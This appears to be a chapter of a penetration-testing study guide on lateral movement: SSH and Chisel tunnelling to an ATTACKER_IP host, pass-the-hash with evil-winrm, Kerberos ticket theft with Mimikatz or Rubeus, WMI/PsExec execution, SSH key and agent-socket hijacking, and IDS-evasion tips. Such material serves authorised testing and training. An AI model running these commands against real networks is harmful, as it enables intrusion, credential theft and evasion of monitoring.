# 07 - Lateral Movement & Pivoting

You have rooted one machine. The real network is behind it. Lateral movement ensures you can spread throughout the environment without needing external-facing vulnerabilities every time.

## 1. Network Pivoting Strategies (Routing Traffic)
You must proxy your offensive tools (Nmap, Metasploit, Impacket) through the compromised host to attack internal subnets.
- **SSH Tunneling (Local & Dynamic Port Forwarding):**
  - `ssh -D 1080 user@compromised_IP` -> Use `proxychains nmap -sT ...`
- **Chisel:** The fastest HTTP/Websockets tunnel. 
  - (Server/Attacker): `chisel server -p 8000 --reverse`
  - (Client/Victim): `chisel client ATTACKER_IP:8000 R:socks`
- **Ligolo-ng / SSHuttle:** Advanced VPN-like routing tools. Treat the pivoting host as a seamless gateway.

## 2. Active Directory Lateral Movement
- **Pass-the-Hash (PtH):**
  - Use `evil-winrm` or `crackmapexec` to log in using an NTLM hash instead of a plaintext password.
  - `evil-winrm -i 10.10.10.150 -u Administrator -H <NTLM_HASH>`
- **Pass-the-Ticket (PtT):**
  - Extract Kerberos TGTs (Ticket Granting Tickets) from memory using `Mimikatz` or `Rubeus`. Inject them into your session to impersonate domain users.
- **Overpass-the-Hash:**
  - Convert an NTLM hash into a Kerberos ticket for stealthier movement.

## 3. Trust Abuse & RPC Movement
- **WMI (Windows Management Instrumentation) & WinRM:**
  - Execute commands remotely living completely off the land.
  - `wmiexec.py` or `psexec.py` (Creates a service, noisier).
- **DCOM (Distributed Component Object Model) & MMC20.Application:**
  - Abusing COM objects to spawn processes on remote machines via RPC.

## 4. SSH Key Pilfering & Lateral Movement
- Gather `known_hosts` and `id_rsa` keys from the current machine.
- Try `ssh -i id_rsa user@internal_IP`.
- Check for SSH Agent Forwarding (Hijacking active SSH sockets in `/tmp/` to jump to the next machine using an admin's forwarded credentials).

## 💡 Advanced Mindset Check (The Pivot Chain)
Movement is loud. Avoid port scanning whole internal subnets directly through a reverse SOCKS proxy (it is slow and triggers network IDSs). 
Ping sweeps first. 
Upload a statically compiled network scanner (`nmap` binary, or `ping` loop script) to the Pivot Machine and scan locally, then only forward traffic to confirmed targets.
